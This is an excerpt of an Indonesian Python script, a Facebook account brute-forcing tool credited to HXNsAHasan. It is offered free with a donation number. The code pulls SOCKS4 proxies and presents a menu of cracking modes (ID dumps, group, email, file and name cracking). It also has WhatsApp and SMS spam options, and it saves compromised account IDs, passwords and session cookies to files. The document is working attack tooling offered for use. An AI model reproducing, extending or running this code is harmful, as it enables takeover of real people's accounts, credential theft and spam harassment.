# [+] Update By HXNsAHasan And All
# [+] Script Free Jangan Di Perjual Belikan Ya
# [+] Donasi Untuk HXNsAHasan
# [+] Dana : 085640486599
...
sys.stdout.write('\x1b]2; HXNsA | Hasan Multi Brute Facebook\x07')
#------------------[ USER-AGENT ]-------------------#
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print(' [+] Koneksi Internet Anda Tidak Terdeteksi Silahkan Cek Kuota Anda Ya');exit()
				...
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					...
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						...
						if 'Sukses!' in str(response6):
							...
							os.system("xdg-open https://youtube.com/@BERO_Hasan")
							print("\n [+] Login Berhasil Ketik Ulang| python hxnsav2.py");followdong()
			except Exception as e:
...
def menu(my_name,my_id):
	...
	cetak(panel(f"[bold white]Alvino_Xy , DerrXr , Asepit-Gans , Rozhak XD , Rochmat Basuki , Hasan GZ , Nazri XD , Aorec XD , Lukman-XD , Dapunta , Kall",width=90,title=f"[bold green]Thanks To",style=f"bold white"))
	...
	_____HXNsAHasan___GZ____ = input(f' [+] Pilih Menu Crack : ')
	if _____HXNsAHasan___GZ____ in ['1','01']:
		Hasan_dump()
	elif _____HXNsAHasan___GZ____ in ['2','02']:
		dump_massal()
	elif _____HXNsAHasan___GZ____ in ['3','03']:
		crack_group()
	elif _____HXNsAHasan___GZ____ in ['4','04']:
		crack_email()
	elif _____HXNsAHasan___GZ____ in ['5','05']:
		crack_file()
	elif _____HXNsAHasan___GZ____ in ['6','06']:
		crack_nama()
	elif _____HXNsAHasan___GZ____ in ['7','07']:
		pengikut()
	elif _____HXNsAHasan___GZ____ in ['8','08']:
		komen()
	elif _____HXNsAHasan___GZ____ in ['9','09']:
		file_cp()
	elif _____HXNsAHasan___GZ____ in ['10']:
		result()
	elif _____HXNsAHasan___GZ____ in ['11']:
		siu()
	elif _____HXNsAHasan___GZ____ in ['12']:
		spam_wa()
	elif _____HXNsAHasan___GZ____ in ['13']:
		spam_sms()
	elif _____HXNsAHasan___GZ____ in ['14']:
		dumpid()
	elif _____HXNsAHasan___GZ____ in ['15']:
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					...
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='HXNsAHasan-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				...
				if 'no' in taplikasi:
					...
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='HXNsAHasan-OK')
					cetak(statusok1)
